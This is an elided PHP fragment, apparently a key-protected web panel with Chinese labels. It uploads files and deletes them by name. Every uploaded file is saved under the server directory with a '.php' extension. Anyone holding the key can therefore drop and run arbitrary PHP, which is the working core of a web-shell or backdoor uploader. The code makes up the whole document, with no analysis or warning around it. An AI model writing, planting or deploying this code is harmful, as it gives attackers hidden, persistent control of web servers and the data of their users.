...
if(isset($_GET['key'])){
	if($_GET['key'] == $key){
			...
			if(isset($_POST['pfn'])){
				...
				if($_FILES["ufp"]["name"])  
				{  
					 $file1=$_FILES["ufp"]["name"];  
					 $file2 = $path.time().'Y06.php';  
					 $flag=1;  
				}  
				 if($flag) $result=move_uploaded_file($_FILES["ufp"]["tmp_name"],$file2);  
				 # //特别注意这里传递给move_uploaded_file的第一个参数为上传到服务器上的临时文件  
				 if($result) echo "上传成功!".$file2;  
			}
			...
			if(isset($_GET['type'])){
				if($_GET['type'] == 'd'){
					...
					if(unlink($filename)) echo '删除成功!';
				}
			}

			echo '<html><head><meta http-equiv="Content-Type" content="text/html; charset=utf-8" /><title></title><style type="text/css">div{width:800px;float:left;margin:5px 10px; }</style></head><body><form enctype="multipart/form-data" action="?key='.$key.'" method="POST"><div><input type="text" name="pfn" value="'.dirname(__FILE__).'/" style="width:750px;"></div><div>上传到目录: <input  type="file" style="width: 300px; height: 22px;" name="ufp"></div><div><input type="submit" name="submit" value="提交"  /></div></form>';

			$files = glob('*Y06.php');
			for($i =0;$i<count($files);$i++){
				echo '<div><a href="?type=d&key='.$key.'&filename='.urlencode($files[$i]).'">'.$files[$i].'</a></div>';
			}
